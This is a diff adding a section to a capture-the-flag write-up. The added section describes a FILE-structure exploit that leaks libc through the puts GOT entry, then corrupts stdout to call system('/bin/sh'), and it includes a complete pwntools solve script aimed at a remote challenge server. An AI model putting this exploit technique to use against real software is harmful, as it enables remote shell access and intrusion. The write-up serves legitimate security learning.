@@ -160,6 +160,8 @@ After using option 3, we can see that the struct is now populated with values.
 The contents of the bee script is read into 0x405690 which corresponds to the values in the struct above. Now, our goal will be to overwrite the pointers on the struct to trick it into thinking theres a buffer located somewhere else. Then we will use option 3 to leak this value. Our target will be the GOT entry of puts()
 
 ```
+GOT protection: Full RelRO | GOT functions: 13
+
 [0x403f88] puts@GLIBC_2.2.5  →  0x7ffff7c80ed0
 ```
 
@@ -172,6 +174,126 @@ payload += p64(0x404f88)
 payload += p64(0x403f88) * 5
 payload += p64(0x404f88)
 ```
+
+![image](https://github.com/user-attachments/assets/32f89dfc-24e7-4817-abcd-78f7ad8980bd)
+
+Now that we know where is libc, maybe we can spawn a shell on the server. To do that, we need to be able to freely write anywhere in memory. Luckily for us, there is a 2nd file struct which lets us write data. Now, we should overwrite the struct fields to trick libc into thinking that the buffer is located somewhere else. But where should we write to? I used [angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/) to spawn shell on server. 
+
+### Getting Arbitrary Write
+
+```py
+payload = b"A" * (0x198 + 0x70)
+payload += p64(0x1e1)
+payload += p64(0xfbad2c84)
+payload += p64(stdout) 
+payload += p64(0x0) * 5
+payload += p64(stdout)
+payload += p64(stdout + 0x1000)
+```
+
+![image](https://github.com/user-attachments/assets/52214079-50ad-4ed1-92da-b9907e244482)
+
+Now, the buffer for our write is located at `_IO_2_1_stdout_`. The next thing to do would be to overwrite stdout with our payload.
+
+![image](https://github.com/user-attachments/assets/ed3c8a0d-a18c-4f47-aca7-60b5718e81c0)
+
+<details>
+<summary>Solve Script</summary>
+
+```py
+#!/usr/bin/python
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./chall_patched')
+libc = exe.libc
+
+host = "43.216.119.115"
+port = 32782
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+# p = exe.process()
+p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+sla(b"Choice: ", "3")
+
+payload = b"A" * 0x28
+payload += p64(0x1e1)
+payload += p64(0xfbad2488)
+payload += p64(0x403f88)
+payload += p64(0x404f88)
+payload += p64(0x403f88) * 5
+payload += p64(0x404f88)
+
+sla(b"Choice: ", "1")
+s(payload)
+sla(b"Choice: ", "3")
+
+ru(b"reference:\n")
+libc.address = u64(rl() + b"\x00\x00") - (0x7f9149c80ed0 - 0x00007f9149c00000)
+environ = libc.sym["environ"]
+li(f"Libc base @ {hex(libc.address)}")
+
+stdout_lock = libc.address + 0x21ba70
+stdout = libc.sym['_IO_2_1_stdout_']
+fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
+gadget = libc.address + 0x0000000000163830
+
+payload = b"A" * (0x198 + 0x70)
+payload += p64(0x1e1)
+payload += p64(0xfbad2c84)
+payload += p64(stdout) 
+payload += p64(0x0) * 5
+payload += p64(stdout)
+payload += p64(stdout + 0x1000)
+
+print(hex(len(payload)))
+sla(b"Choice: ", "1")
+s(payload)
+
+fake = FileStructure(0)
+fake.flags = 0x3b01010101010101
+fake._IO_read_end=libc.sym['system']
+fake._IO_save_base = gadget
+fake._IO_write_end=u64(b'/bin/sh\x00')
+fake._lock=stdout_lock
+fake._codecvt= stdout + 0xb8
+fake._wide_data = stdout+0x200
+fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
+
+print(hex(len(bytes(fake))))
+sla(b"Choice: ", "2")
+s(bytes(fake))
+
+# debug()
+
+p.interactive()
+```
+
+</details>
 
 ## Game/World 1
 
